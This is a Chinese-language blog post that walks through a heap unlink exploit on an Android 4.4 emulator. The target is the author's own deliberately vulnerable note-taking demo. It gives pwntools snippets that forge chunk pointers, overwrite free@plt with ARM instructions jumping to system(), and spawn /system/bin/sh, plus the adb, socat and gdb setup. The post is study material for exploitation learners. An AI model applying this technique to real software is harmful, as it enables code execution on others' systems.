<!doctype html>
<html class="theme-next use-motion theme-next-mist">
<head>
  

<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />








  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>



  
    <link href='//fonts.googleapis.com/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
  


<link rel="stylesheet" type="text/css" href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" />

<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.2"/>




  <meta name="keywords" content="Android,heap,exploit," />





  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.2" />


<meta name="description" content="前言最近学习了堆的管理，如何进行unlink利用。发现大多数文章在讲解利用unlink进行任意地址写时没有解释得很透彻（也可能是我比较愚钝吧(╯﹏╰）），看得是云里雾里:-(。。。。。直到看到了shellphish团队在github上的项目how2heap，才弄明白了利用unlink进行任意地址写的原理。于是自己在Android4.4模拟器上设计了一个Demo，用于练习unlink利用。下面基于这">
<meta property="og:type" content="article">
<meta property="og:title" content="Android中堆unlink利用学习">
<meta property="og:url" content="http://yoursite.com/2016/05/19/AndroidHeapUnlinkExploitPractice/index.html">
<meta property="og:site_name" content="ManyFace">
<meta property="og:description" content="前言最近学习了堆的管理，如何进行unlink利用。发现大多数文章在讲解利用unlink进行任意地址写时没有解释得很透彻（也可能是我比较愚钝吧(╯﹏╰）），看得是云里雾里:-(。。。。。直到看到了shellphish团队在github上的项目how2heap，才弄明白了利用unlink进行任意地址写的原理。于是自己在Android4.4模拟器上设计了一个Demo，用于练习unlink利用。下面基于这">
<meta property="og:image" content="http://yoursite.com/img/androidheapunlink/mem_1.jpg">
<meta property="og:image" content="http://yoursite.com/img/androidheapunlink/free_chunk.jpg">
<meta property="og:image" content="http://yoursite.com/img/androidheapunlink/fake_free_note.png">
<meta property="og:image" content="http://yoursite.com/img/androidheapunlink/notes.png">
<meta property="og:image" content="http://yoursite.com/img/androidheapunlink/free_plt.png">
<meta property="og:image" content="http://yoursite.com/img/androidheapunlink/notes_free_plt.png">
<meta property="og:image" content="http://yoursite.com/img/androidheapunlink/system.png">
<meta property="og:image" content="http://yoursite.com/img/androidheapunlink/result.png">
<meta property="og:updated_time" content="2016-05-20T02:35:37.830Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Android中堆unlink利用学习">
<meta name="twitter:description" content="前言最近学习了堆的管理，如何进行unlink利用。发现大多数文章在讲解利用unlink进行任意地址写时没有解释得很透彻（也可能是我比较愚钝吧(╯﹏╰）），看得是云里雾里:-(。。。。。直到看到了shellphish团队在github上的项目how2heap，才弄明白了利用unlink进行任意地址写的原理。于是自己在Android4.4模拟器上设计了一个Demo，用于练习unlink利用。下面基于这">
<meta name="twitter:image" content="http://yoursite.com/img/androidheapunlink/mem_1.jpg">


<script type="text/javascript" id="hexo.configuration">
  var CONFIG = {
    scheme: 'Mist',
    sidebar: '[object Object]'
  };
</script>



  <title> Android中堆unlink利用学习 | ManyFace </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  <!--[if lte IE 8]>
  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
           style='margin-left:auto;margin-right:auto;display: block;'/>
    </a>
  </div>
<![endif]-->
  






  <div class="container one-column page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">ManyFace</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle">ManyFace</p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu ">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      

      
      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div id="content" class="content"> 

  <div id="posts" class="posts-expand">
    

  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                Android中堆unlink利用学习
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            Posted on
            <time itemprop="dateCreated" datetime="2016-05-19T22:46:47+08:00" content="2016-05-19">
              2016-05-19
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; In
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/Android/" itemprop="url" rel="index">
                    <span itemprop="name">Android</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        <span itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近学习了堆的管理，如何进行unlink利用。发现大多数文章在讲解利用unlink进行任意地址写时没有解释得很透彻（也可能是我比较愚钝吧(╯﹏╰）），看得是云里雾里:-(。。。。。直到看到了shellphish团队在github上的项目how2heap，才弄明白了利用unlink进行任意地址写的原理。于是自己在Android4.4模拟器上设计了一个Demo，用于练习unlink利用。下面基于这个Demo来具体分析unlink利用的原理。在继续阅读之前，可以先看一下这一篇<a href="http://www.tuicool.com/articles/E3Ezu2u" target="_blank" rel="external">博文</a>。由于水平有限，不对的地方还请各位大牛赐教。<br><a id="more"></a></p>
<h1 id="Demo分析"><a href="#Demo分析" class="headerlink" title="Demo分析"></a>Demo分析</h1><p>该Demo是一个native可执行程序(<a href="https://github.com/ManyFace/AndroidHeap/blob/master/AndroidUnlinkExploit/unlink_demo.c" target="_blank" rel="external">源码</a>)，主要的功能是建立note，并保存用户的输入到该note，每一个note的大小为0x80，总共可以新建10个note，每个note可以通过notes这个全局变量来索引。比如：建立一个note，索引为0，note 0 的内容为“1234”；然后把 note 0 的内容重新改为“5678”；接着释放掉note 0；最后退出程序。其操作如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@generic:/data/local/tmp # ./unlink_demo</span><br><span class="line">usage: 0:malloc 1:free 2:edit 3:exit</span><br><span class="line">input cmd and note index (eg:0,1 -&gt; cmd=0,note_index=1):</span><br><span class="line">0,0    //新建note 0</span><br><span class="line">input note len:</span><br><span class="line">4     //输入note 0的内容长度</span><br><span class="line">input note:</span><br><span class="line">1234  //输入note 0的内容</span><br><span class="line">usage: 0:malloc 1:free 2:edit 3:exit</span><br><span class="line">input cmd and note index (eg:0,1 -&gt; cmd=0,note_index=1):</span><br><span class="line">2,0   //修改note 0的内容</span><br><span class="line">input note len:</span><br><span class="line">4     //输入note 0的内容长度</span><br><span class="line">input note:</span><br><span class="line">5678  //输入note 0的内容</span><br><span class="line">usage: 0:malloc 1:free 2:edit 3:exit</span><br><span class="line">input cmd and note index (eg:0,1 -&gt; cmd=0,note_index=1):</span><br><span class="line">1,0   //释放note 0</span><br><span class="line">usage: 0:malloc 1:free 2:edit 3:exit</span><br><span class="line">input cmd and note index (eg:0,1 -&gt; cmd=0,note_index=1):</span><br><span class="line">3   //退出程序</span><br></pre></td></tr></table></figure></p>
<p>然而在handle_cmd()函数中，给notes中的note赋值时，没有对note_size进行检查，如果note_size大于0x80，会导致堆溢出。</p>
<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>这里把利用过程分为6个步骤：</p>
<ol>
<li>新建note 0和note 1</li>
<li>伪造相关数据</li>
<li>free(notes[1])，触发unlink</li>
<li>将free@plt的地址写入notes[0]</li>
<li>修改free@plt的指令</li>
<li>新建并释放notes[2]，触发system(“/system/bin/sh”)</li>
</ol>
<p>下面对每一个步骤进行详细的讲解。</p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>启动一个Android 4.4模拟器(Arm)，将unlink_demo、gdb和socat push到/data/local/tmp目录下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb push unlink_demo /data/<span class="built_in">local</span>/tmp</span><br><span class="line">adb push gdb /data/<span class="built_in">local</span>/tmp</span><br><span class="line">adb push socat /data/<span class="built_in">local</span>/tmp</span><br></pre></td></tr></table></figure></p>
<p>进入模拟器shell环境，通过socat将unlink_demo作为服务绑定到端口12345：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line"><span class="built_in">cd</span> /data/<span class="built_in">local</span>/tmp</span><br><span class="line">./socat tcp4-listen:12345,fork <span class="built_in">exec</span>:/unlink_demo</span><br></pre></td></tr></table></figure></p>
<p>在主机上配置端口转发：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:12345 tcp:12345</span><br></pre></td></tr></table></figure></p>
<p>安装<a href="http://pwntools.com/" target="_blank" rel="external">Pwntools</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure></p>
<h2 id="step-1-新建note-0和note-1"><a href="#step-1-新建note-0和note-1" class="headerlink" title="step 1. 新建note 0和note 1"></a>step 1. 新建note 0和note 1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">self.__malloc_note(<span class="number">0</span>, <span class="number">4</span>, <span class="string">"c"</span> * <span class="number">4</span>)</span><br><span class="line">self.__malloc_note(<span class="number">1</span>, <span class="number">4</span>, <span class="string">"c"</span> * <span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<p>这里建立了两个note，内容均初始化为”cccc”，此时的内存布局如下图所示。</p>
<p><img src="/img/androidheapunlink/mem_1.jpg" alt="mem_1"></p>
<p>notes[0]中存的是note 0的起始地址，notes[1]中存的是note 1的起始地址。在使用malloc进行分配内存时，对于32位来说，分配的内存是8字节对齐的，且实际分配内存的起始地址要比malloc的返回值小8，多出的8个字节表示前一个内存块的大小presize(如果前一个内存块是空闲的)和当前内存块的大小size，由于内存8字节对齐，因而size的低3位用作标志位。</p>
<h2 id="step-2-伪造相关数据"><a href="#step-2-伪造相关数据" class="headerlink" title="step 2. 伪造相关数据"></a>step 2. 伪造相关数据</h2><p>首先来看一下Android中空闲内存块的结构：<br>　　　　<img src="/img/androidheapunlink/free_chunk.jpg" alt="free chunk"></p>
<ul>
<li>presize: 前一个块的大小(如果前一个块是空闲的)</li>
<li>size：当前块的大小</li>
<li>F标志位：目前还没有用</li>
<li>C标志位：如果当前块已被分配，置1；否则，置0</li>
<li>P标志位：如果前一个块已被分配，置1,；否则，置0</li>
<li>如果C、P都是0，表示该内存块是通过mmap得到的，这也说明了在内存中，是不存在两个连续相邻的大内存块。(<strong>注意：</strong> Android中空闲内存块标志位的含义和Linux的不一样)</li>
<li>fd：下一个空闲内存块的地址</li>
<li>bk：上一个空闲内存块的地址</li>
</ul>
<p>可见空闲内存块被连接成了双向空闲链表。当free一个内存块时，会检查前一个内存块是否是空闲的，如果是，首先会调用unlink()函数将前一个空闲内存块从空闲链表中移除，然后将当前内存块和前一个内存块合并，最后将合并后的内存块加入空闲链表中。(当然也会检查后一个内存块是否空闲。由于这里设计的利用程序是通过构造向前合并触发unlink，因而没有讨论这种情况，其实原理是一样的）</p>
<p>unlink的关键操作如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将 p 移除链表</span></span><br><span class="line">F = p -&gt; fd;</span><br><span class="line">B = p -&gt; bk;</span><br><span class="line"><span class="keyword">if</span> (F -&gt; bk == p &amp;&amp; B -&gt; fd == p)&#123;</span><br><span class="line">  F -&gt; bk = B;</span><br><span class="line">  B -&gt; fd = F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>由于每个note的大小是0x80，当对note填充内容的长度超过0x80时，就会发生堆溢出。因而，我们可以向 note 0 填充0x88字节的内容，多出的8个字节将会覆盖 note 1 的presize和size&amp;flag。那么如何构造填充的内容以便free(notes[1])的时候触发unlink呢？首先修改 note 1 中的P标志位，将其置0，这样就会认为前一个块 note 0 是空闲的；然后将 note 1 内存块的presize字段改为0x80，这样就会认为前一个内存块大小只有0x80(包括presize、size&amp;flag、fd和bk)，且这0x80字节的内容完全可控；最后设计伪造空闲块的fd和bk。由于unlink时，会对unlink的节点的合法性进行检查，即该节点的前一个节点的bk指针必须指向该节点，并且该节点的后一个节点的fd指针必须指向该节点，因而fd和bk不能随便构造。由于全局变量notes刚好指向note 0 的起始地址，可以把它认为是伪造空闲块的chunk ptr，所以，当fake_free_note-&gt;fake_fd = notes - 12，fake_free_note-&gt;fake_bk = notes - 8 时，就可以绕过unlink的检查。具体的构造代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">notes_addr = int(raw_input(<span class="string">"notes address:"</span>), <span class="number">16</span>)</span><br><span class="line"><span class="comment"># "c"*8 + fake_fd + fake_bk + "c"*0x70 + fake_presize + modify_pre_inuse_flag</span></span><br><span class="line">note0_content = <span class="string">"c"</span> * <span class="number">8</span> + p32(notes_addr - <span class="number">12</span>) + p32(notes_addr - <span class="number">8</span>) + <span class="string">"c"</span> * <span class="number">0x70</span> + p32(<span class="number">0x80</span>) + p32(<span class="number">0x88</span> | <span class="number">0x02</span>)</span><br><span class="line">self.__edit_note(<span class="number">0</span>, <span class="number">0x88</span>, note0_content)</span><br></pre></td></tr></table></figure></p>
<p>其中notes_addr的值可以通过gdb获得(记得退出gdb)：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@generic:/data/local/tmp # ./gdb -pid 3477  //3477 是unlink_demo进程的id</span><br><span class="line">(gdb) p/x *(0xb004)   //通过ida分析可以知道0xb004处存的是notes_addr的地址。</span><br><span class="line">$1 = 0x1030020</span><br><span class="line">(gdb) q</span><br><span class="line">The program is running.  Quit anyway (and detach it)? (y or n) y</span><br></pre></td></tr></table></figure></p>
<p>此时的内存布局如下：</p>
<p><img src="/img/androidheapunlink/fake_free_note.png" alt="fake_free_note"></p>
<h2 id="step-3-free-notes-1-，触发unlink"><a href="#step-3-free-notes-1-，触发unlink" class="headerlink" title="step 3. free(notes[1])，触发unlink"></a>step 3. free(notes[1])，触发unlink</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.__free_note(<span class="number">1</span>)  <span class="comment"># free notes[1]</span></span><br></pre></td></tr></table></figure>
<p>由于在 note 1 前面构造了一个伪造的空闲内存块，当free(notes[1])时，就会对伪造的空闲内存块进行unlink操作：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">F = p -&gt; fd;  <span class="comment">//F = notes - 12</span></span><br><span class="line">B = p -&gt; bk;  <span class="comment">//B = notes - 8</span></span><br><span class="line"><span class="keyword">if</span> (F -&gt; bk == p &amp;&amp; B -&gt; fd == p)&#123;</span><br><span class="line">  F -&gt; bk = B;  <span class="comment">// 即notes[0] = B = notes - 8</span></span><br><span class="line">  B -&gt; fd = F;  <span class="comment">// 即notes[0] = F = notes -12</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>从上可知，unlink后，notes[0]存的不再是note 0 的起始地址了，而是notes - 12。此时我们只关心notes数组的内存，其布局如下：</p>
<p><img src="/img/androidheapunlink/notes.png" alt="notes"></p>
<h2 id="step-4-将free-plt的地址写入notes-0"><a href="#step-4-将free-plt的地址写入notes-0" class="headerlink" title="step 4. 将free@plt的地址写入notes[0]"></a>step 4. 将free@plt的地址写入notes[0]</h2><p>由于此时notes[0] = notes -12 ，所以notes[0][0]其实就是 notes - 12 地址处的一个字节，notes[0][12~15]其实就是notes[0]。因而我们可以通过向note 0写入16个字节将任意值写入notes[0]，这里将.plt section中free的地址写入notes[0]：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">note0_content = <span class="string">"c"</span> * <span class="number">12</span> + p32(self.free_plt_addr)</span><br><span class="line">self.__edit_note(<span class="number">0</span>, <span class="number">0x10</span>, note0_content)</span><br></pre></td></tr></table></figure></p>
<p>在ida中查看free_plt_addr为0x8558</p>
<p><img src="/img/androidheapunlink/free_plt.png" alt="free_plt"></p>
<p>此时notes数组的内存如下：</p>
<p><img src="/img/androidheapunlink/notes_free_plt.png" alt="notes_free_plt"></p>
<h2 id="step-5-修改free-plt的指令"><a href="#step-5-修改free-plt的指令" class="headerlink" title="step 5. 修改free@plt的指令"></a>step 5. 修改free@plt的指令</h2><p>为了调用free()时，实际调用的是system()，这里需要将free@plt函数的指令修改使其跳转到system()函数。首先我们把模拟器上的libc.so拿到：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull /system/lib/libc.so</span><br></pre></td></tr></table></figure></p>
<p>然后在ida中查看system函数的偏移：</p>
<p><img src="/img/androidheapunlink/system.png" alt="system_offset"></p>
<p>可见system的指令为thumb指令，在libc.so中的偏移为system_offset=0x246A1。接着通过读取/proc/pid/maps得到libc.so的基址libc_base，从而system()在内存中的实际地址就是system_addr=libc_base+system_offset。</p>
<p>于是刚好可以将free@plt的指令修改为：<br><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR </span><span class="built_in">R1</span>, [<span class="built_in">PC</span>]</span><br><span class="line"><span class="keyword">BLX </span><span class="built_in">R1</span></span><br><span class="line"><span class="symbol">system_addr</span></span><br></pre></td></tr></table></figure></p>
<p>假如system_addr为0xB124A561，那么上面指令的机器码为：<br><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00109</span>FE5</span><br><span class="line"><span class="number">31</span>FF2FE1</span><br><span class="line"><span class="number">61</span>A524B1</span><br></pre></td></tr></table></figure></p>
<p>具体的代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">note0_content = p32(<span class="number">0xE59F1000</span>) + p32(<span class="number">0xE12FFF31</span>) + p32(self.system_addr)</span><br><span class="line">self.__edit_note(<span class="number">0</span>, <span class="number">0xC</span>, note0_content)</span><br></pre></td></tr></table></figure></p>
<p>ps:<br>在unlink_demo中.got section所在segment的flags是可写的，但是一运行起来，从/proc/pid/maps得到的结果却是该segment只读。。。于是只好修改unlink_demo文件中代码段的属性为可读写，这样就可以运行时修改free@plt的指令了。<br>其实本来想直接修改got中free的地址，苦于这段内存只读，不知道怎么设置为可写。。。。还望各位大神指点啊！</p>
<h2 id="step-6-新建并释放notes-2-，触发system-“-system-bin-sh”"><a href="#step-6-新建并释放notes-2-，触发system-“-system-bin-sh”" class="headerlink" title="step 6. 新建并释放notes[2]，触发system(“/system/bin/sh”)"></a>step 6. 新建并释放notes[2]，触发system(“/system/bin/sh”)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">self.__malloc_note(<span class="number">2</span>, <span class="number">0xE</span>, <span class="string">"/system/bin/sh"</span>)</span><br><span class="line">self.__free_note(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>当free(notes[2])时，由于free@plt会直接跳转到system()，所以这里相当于调用system(notes[2])，而notes[2]指向“/system/bin/sh”，所以这里相当于执行system(“/system/bin/sh”)，从而得到shell，利用成功！</p>
<h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p>运行利用程序exp_unlink.py，通过gdb得到notes的地址，最后的运行结果如下：</p>
<p><img src="/img/androidheapunlink/result.png" alt="result"></p>
<p>ps:</p>
<ul>
<li>完整的利用代码和涉及到的工具可以在<a href="https://github.com/ManyFace/AndroidHeap/tree/master/AndroidUnlinkExploit" target="_blank" rel="external">我的github</a>下载</li>
<li>将how2heap中unsafe_unlink.c修改为32位后在Android模拟器上是运行不成功的，通过对比Linux和Android unlink时的源码发现，在Android中多了一条检测条件：ok_address(M, F)，就是检查F地址的合法性，因为malloc/free绝对不会向一个静态地址写数据。于是将unsafe_unlink.c中uint32_t* pointer_vector[10];改为 uint32_t** pointer_vector; pointer_vector=(uint32_t**)malloc(10*sizeof(uint32_t));就可以在Android上跑通了。</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://github.com/shellphish/how2heap/blob/master/unsafe_unlink.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/unsafe_unlink.c</a></li>
</ol>
<ul>
<li><a href="http://www.tuicool.com/articles/E3Ezu2u" target="_blank" rel="external">http://www.tuicool.com/articles/E3Ezu2u</a></li>
<li><a href="http://code.woboq.org/userspace/glibc/malloc/malloc.c.html" target="_blank" rel="external">http://code.woboq.org/userspace/glibc/malloc/malloc.c.html</a></li>
<li><a href="http://androidxref.com/5.1.1_r6/xref/bionic/libc/upstream-dlmalloc/malloc.c" target="_blank" rel="external">http://androidxref.com/5.1.1_r6/xref/bionic/libc/upstream-dlmalloc/malloc.c</a></li>
<li><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/" target="_blank" rel="external">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</a></li>
</ul>
</span>
      
    </div>

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Android/" rel="tag">#Android</a>
          
            <a href="/tags/heap/" rel="tag">#heap</a>
          
            <a href="/tags/exploit/" rel="tag">#exploit</a>
          
        </div>
      

      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>

 </div>

        

        
          <div class="comments" id="comments">
            
          </div>
        
      </div>

      
        
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
            Table Of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            Overview
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" src="/images/avatar.png" alt="ManyFace" itemprop="image"/>
          <p class="site-author-name" itemprop="name">ManyFace</p>
        </div>
        <p class="site-description motion-element" itemprop="description"></p>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">1</span>
              <span class="site-state-item-name">posts</span>
            </a>
          </div>

          <div class="site-state-item site-state-categories">
            <a href="/categories">
              <span class="site-state-item-count">1</span>
              <span class="site-state-item-name">categories</span>
              </a>
          </div>

          <div class="site-state-item site-state-tags">
            <a href="/tags">
              <span class="site-state-item-count">3</span>
              <span class="site-state-item-name">tags</span>
              </a>
          </div>

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/ManyFace" target="_blank">
                  <i class="fa fa-github"></i> github
                </a>
              </span>
            
          
        </div>

        
        

        <div class="links-of-author motion-element">
          
        </div>

      </section>

      
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc-indicator-top post-toc-indicator"></div>
          <div class="post-toc">
            
            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Demo分析"><span class="nav-number">2.</span> <span class="nav-text">Demo分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用"><span class="nav-number">3.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#准备"><span class="nav-number">3.1.</span> <span class="nav-text">准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#step-1-新建note-0和note-1"><span class="nav-number">3.2.</span> <span class="nav-text">step 1. 新建note 0和note 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#step-2-伪造相关数据"><span class="nav-number">3.3.</span> <span class="nav-text">step 2. 伪造相关数据</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#step-3-free-notes-1-，触发unlink"><span class="nav-number">3.4.</span> <span class="nav-text">step 3. free(notes[1])，触发unlink</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#step-4-将free-plt的地址写入notes-0"><span class="nav-number">3.5.</span> <span class="nav-text">step 4. 将free@plt的地址写入notes[0]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#step-5-修改free-plt的指令"><span class="nav-number">3.6.</span> <span class="nav-text">step 5. 修改free@plt的指令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#step-6-新建并释放notes-2-，触发system-“-system-bin-sh”"><span class="nav-number">3.7.</span> <span class="nav-text">step 6. 新建并释放notes[2]，触发system(“/system/bin/sh”)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#结果"><span class="nav-number">4.</span> <span class="nav-text">结果</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
            
          </div>
          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
        </section>
      

    </div>
  </aside>


      
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner"> <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2016</span>
  <span class="with-love">
    <i class="icon-next-heart fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ManyFace</span>
</div>

<div class="powered-by">
  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
</div>

<div class="theme-info">
  Theme -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Mist
  </a>
</div>


 </div>
    </footer>

    <div class="back-to-top"></div>
  </div>

  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  
  
    
    

  


  
  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.2"></script>


  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.2"></script>
  

  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>

  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.2" id="motion.global"></script>




  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.2"></script>
  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  
<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.2" id="bootstrap.scrollspy.custom"></script>


